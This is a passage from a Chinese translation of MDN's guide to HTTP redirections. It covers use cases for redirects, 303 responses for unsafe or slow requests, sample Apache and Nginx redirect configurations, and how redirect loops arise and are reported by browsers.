- 扩大站点的用户覆盖面。

  一个常见的场景是，假如站点位于 `www.example.com` 域名下，那么通过 `example.com `也应该可以访问到。这种情况下，可以建立从 `example.com` 的页面到 `www.example.com` 的重定向映射。此外还可以提供常见的同义词，或者该域名容易导致的拼写错误的域名别称。

- 迁移到另外一个域名。

  例如，公司改名后，你希望用户在搜索旧名称的时候，依然可以访问到应用了新名称的站点。

- 强制使用 HTTPS 协议。

  对于 HTTP 版本站点的请求会被重定向至采用了 HTTPS 协议的版本。



### 保持链接有效

当你重构 Web 站点的时候，资源的 URL 会发生改变。即便是你可以更新站点内部的链接来适应新的命名体系，但无法控制被外部资源使用的 URL 。

你并不想因此而使旧链接失效，因为它们会为你带来宝贵的用户（并且帮助优化你的SEO），所以需要建立从旧链接到新链接的重定向映射。

> 即便是这项技术可以同样应用于内部链接，但是应该尽量避免内部重定向映射。重定向机制会带来相当大的性能开销（额外的 HTTP 请求），所以如果你可以通过修复链接来避免的话，那么就应该将其修复。


### [对于不安全请求的临时响应](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Redirections#对于不安全请求的临时响应)

不安全（[Unsafe](https://developer.mozilla.org/zh-CN/docs/Glossary/safe)）请求会修改服务器端的状态，应该避免用户无意的重复操作。

通常，你并不想要你的用户重复发送  [`PUT`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/PUT)、[`POST`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST) 或 [`DELETE`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/DELETE) 请求。假如你仅仅为该类请求返回响应的话，简单地点击刷新按钮就会（可能会有一个确认信息）导致请求的重复发送。

在这种情况下，服务器可以返回一个 [`303`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/303) (See Other) 响应，其中含有合适的响应信息。如果刷新按钮被点击的话，只会导致该页面被刷新，而不会重复提交不安全的请求。

### [对于耗时请求的临时响应](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Redirections#对于耗时请求的临时响应)

一些请求的处理会需要比较长的时间，比如有时候 [`DELETE`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/DELETE) 请求会被安排为稍后处理。在这种情况下，会返回一个 [`303`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/303) (See Other)  重定向响应，该响应链接到一个页面，表示请求的操作已经被列入计划，并且最终会通知用户操作的进展情况，或者允许用户将其取消。

## [在通用服务器中配置重定向](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Redirections#在通用服务器中配置重定向)

### [Apache](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Redirections#apache)

重定向映射可以在服务器的配置文件中设置，也可以在每一个文件目录的 .htaccess 文件中设置。

[mod_alias](https://httpd.apache.org/docs/current/mod/mod_alias.html) 模块提供了 `Redirect` 和 `Redirect_Match` 两种指令来设置 [`302`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/302) 响应（默认值）：

```
<VirtualHost *:443>
	ServerName example.com
	Redirect / https://www.example.com
</VirtualHost>
```

URL `https://example.com/` 会被重定向至 `https://www.example.com/` ，URL 下的任何文件或目录也将重定向到该 URL（`https://example.com/some-page` 将重定向至 `https://www.example.com/some-page`）。

`Redirect_Match` 指令的功能与之类似，不同之处在于它可以通过[正则表达式](https://developer.mozilla.org/zh-CN/docs/Glossary/Regular_expression)来指定一批受影响的 URL ：

```
RedirectMatch ^/images/(.*)$ http://images.example.com/$1
```

位于 `images/` 文件夹下的所有文档都会被重定向至新的域名。

如果你不想要设置临时跳转，那么可是使用额外的参数（使用 HTTP 状态码或者 permanent 关键字）来进行设置：

```
Redirect permanent / https://www.example.com
# …acts the same as:
Redirect 301 / https://www.example.com
```

[mod_rewrite](https://httpd.apache.org/docs/current/mod/mod_rewrite.html) 模块也可以用来设置重定向映射。它应用起来更灵活，但也更加复杂。

### [Nginx](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Redirections#nginx)

在 Nginx 中，你可以创建一个服务器模块来进行重定向设置：

```
server {
	listen 80;
	server_name example.com;
	return 301 $scheme://www.example.com$request_uri;
}
```

可以使用 rewrite 指令来针对一个文件目录或者一部分页面应用重定向设置：

```
rewrite ^/images/(.*)$ http://images.example.com/$1 redirect;
rewrite ^/images/(.*)$ http://images.example.com/$1 permanent;
```

### [IIS](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Redirections#iis)

在 IIS 中，你可以使用 `<httpRedirect>` 元素来配置重定向映射。

---

## [重定向死锁（循环）](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Redirections#重定向死锁（循环）)

当后续的重定向路径重复之前的路径的时候，重定向循环就产生了。换句话说，就是陷入了无限循环当中，不会有一个最终的页面返回。

大多数情况下，这属于服务器端错误。如果服务器检测不到，就会返回 [`500`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/500) `Internal Server Error` 。假如你在修改了服务器配置不久就出现了这个问题，八成是遇到了重定向循环。

有时候，服务器端无法对其进行检测：重定向循环发生于多台服务器之间，对于每一台服务器来说，都无法获得一个全景图。在这种情况下，浏览器会负责进行检测，然后返回错误信息。Firefox 会呈现如下信息：

```
Firefox has detected that the server is redirecting the request for this address in a way that will never complete.
Firefox 检测到服务器正在试图将请求进行重定向，而这种重定向永远不会完结。
```

而 Chrome 则会呈现如下信息：

```
This Webpage has a redirect loop
本页面包含有重定向循环。
```

无论哪个场景，用户对此都无能为力(除非客户端发生突变，比如说缓存或者Cookie不匹配)

避免重定向循环非常重要，因为它会完全毁掉用户的体验。

---

